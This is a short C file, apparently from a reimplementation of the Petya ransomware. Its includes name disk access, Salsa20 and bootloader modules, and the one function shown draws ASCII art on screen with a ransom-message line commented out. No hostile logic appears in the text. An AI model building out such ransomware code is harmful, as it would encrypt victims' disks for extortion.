// petya.c

#include "petya.h"
#include "types.h"
#include "ata.h"
#include "salsa20.h"
#include "bootloader.h"

void print_petya_art(void)
{
    vga_clear();
    vga_draw_centered_ascii(PETYA_ART);    
    //vga_puts(RANSOM_MSG);
    vga_putchar('\n');
}